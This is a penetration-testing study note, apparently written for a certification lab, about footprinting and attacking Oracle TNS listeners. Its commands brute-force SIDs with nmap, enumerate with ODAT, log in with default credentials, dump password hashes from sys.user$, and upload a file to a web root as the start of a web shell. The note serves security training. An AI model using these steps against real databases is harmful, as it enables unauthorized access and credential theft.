---
tags:

- cpts
- cybersecurity
- info gathering
---

# Cheat Sheet

```shell-session
# Default TCP listening on port 1521

# Default files tnsnames.ora and listener.ora location
$ORACLE_HOME/network/admin

# Default files are in PLAIN TEXT

# Nmap scan 
sudo nmap -p1521 -sV {target ip} --open

# Nmap SID Bruteforce
sudo nmap -p1521 -sV {target ip} --open --script oracle-sid-brute

# After setting up ODAT
# Testing ODAT
python3 ./odat.py -h

# Enumerate using ODAT
./odat.py all -s {target ip}


# SQLplus - Log in
sqlplus scott/tiger@10.129.204.235/XE

# Check tables
select table_name from all_tables;

# Check privileges
select * from user_role_privs;

# Connect as sysadmin
sqlplus username/password@{target ip}/XE as sysdba

# Extract Password Hashes
select name, password from sys.user$;

# File Upload web shell to target
# Needs the server to be running a web server and we need to know the exact location of the root dir

# Linux file path 
/var/www/html

# Windows file path
C:\inetpub\wwwroot

# Create text file and upload to the target system
# echo "Oracle File Upload Test" > testing.txt
# ./odat.py utlfile -s {target ip} -d XE -U username -P password --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

# Test if the file upload works using cURL
curl -X GET http://{target ip}/testing.txt
```

# Concepts

- Oracle Transparent Network Substrate (TNS)
- Facilitates communication between oracle databases and applications over networks.
- Supports various network protocols such as `IPX/SPX` and `TCP/IP` and newer tech like `IPv6` and `SSL/TLS`
- The updates over time make it more suitable for:
  - Name resolution
  - Connection management
  - Load balancing
  - Security
- Enables encryption between client and server communication through an additional layer of security over the TCP/IP layer.

## Default Configuration

- Default listening port is `TCP/1521`

- Can be remotely managed in `Oracle 8i/9i` but not Oracle 10g/11g

- Config files for Oracle TNS are called `tnsnames.ora` and `listener.ora`

- Located at:  `$ORACLE_HOME/network/admin`

- The plain text file contains configuration information for Oracle database instances and other network services that use the TNS protocol

- Orcale 9 default password: `CHANGE_ON_INSTALL` but Oracle 10 doesn't

### PL/SQL Exclusion List

- Can be protected through a `PL/SQL Exclusion` list.

- `PlsqlExclusionList` is a user created text file that has to be placed in the `$ORACLE_HOME/sqldeveloper` directory

- contains the names of PL/SQL packages or types that should be excluded from execution

- Basically a blacklist

- | **Setting**          | **Description**                                                                                                          |
  | -------------------- | ------------------------------------------------------------------------------------------------------------------------ |
  | `DESCRIPTION`        | A descriptor that provides a name for the database and its connection type.                                              |
  | `ADDRESS`            | The network address of the database, which includes the hostname and port number.                                        |
  | `PROTOCOL`           | The network protocol used for communication with the server                                                              |
  | `PORT`               | The port number used for communication with the server                                                                   |
  | `CONNECT_DATA`       | Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier. |
  | `INSTANCE_NAME`      | The name of the database instance the client wants to connect.                                                           |
  | `SERVICE_NAME`       | The name of the service that the client wants to connect to.                                                             |
  | `SERVER`             | The type of server used for the database connection, such as dedicated or shared.                                        |
  | `USER`               | The username used to authenticate with the database server.                                                              |
  | `PASSWORD`           | The password used to authenticate with the database server.                                                              |
  | `SECURITY`           | The type of security for the connection.                                                                                 |
  | `VALIDATE_CERT`      | Whether to validate the certificate using SSL/TLS.                                                                       |
  | `SSL_VERSION`        | The version of SSL/TLS to use for the connection.                                                                        |
  | `CONNECT_TIMEOUT`    | The time limit in seconds for the client to establish a connection to the database.                                      |
  | `RECEIVE_TIMEOUT`    | The time limit in seconds for the client to receive a response from the database.                                        |
  | `SEND_TIMEOUT`       | The time limit in seconds for the client to send a request to the database.                                              |
  | `SQLNET.EXPIRE_TIME` | The time limit in seconds for the client to detect a connection has failed.                                              |
  | `TRACE_LEVEL`        | The level of tracing for the database connection.                                                                        |
  | `TRACE_DIRECTORY`    | The directory where the trace files are stored.                                                                          |
  | `TRACE_FILE_NAME`    | The name of the trace file.                                                                                              |
  | `LOG_FILE`           | The file where the log information is stored.                                                                            |

## Footprinting

### Oracle-Tools-setup.sh for ODAT (Oracle Database Attacking Tool)

Bash script to download packages needed for enumerating the TNS listener

```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

Test ODAT using the following

```shell-session
./odat.py -h
```

Enumerate batabase service using ODAT

```shell-session
./odat.py all -s 10.129.204.235
```

### Nmap

```shell-session
sudo nmap -p1521 -sV {target ip} --open
```

### Nmap SID Bruteforcing

- SID = System Identifier

- The client needs to provide the databases SID and connection string when connecting to an oracle database. If not the default value from `tsnames.ora` will be used. 

- Use nmap, hydra, odat and other tools to enumerate SIDs

- ```shell-session
  sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
  ```

### Connect to database using SQL Plus

Take the credentials that are. returned once nmap/odat/hydra finishes the scan

```shell-session
sqlplus username/password@{target ip}/XE
```

**If you get an error such as:**

> sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory

**Try using the following code:**

```shell-session
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

## ORacle RDBMS Interaction

**Get all tabels**

```shell-session
select table_name from all_tables;
```

**Check privileges of user you're logged in as**

```shell-session
select * from user_role_privs
```

**Connect as sys db admin**

```shell-session
sqlplus username/password@{target ip}/XE as sysdba
```

# References

[1521,1522-1529 - Pentesting Oracle TNS Listener | HackTricks](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener)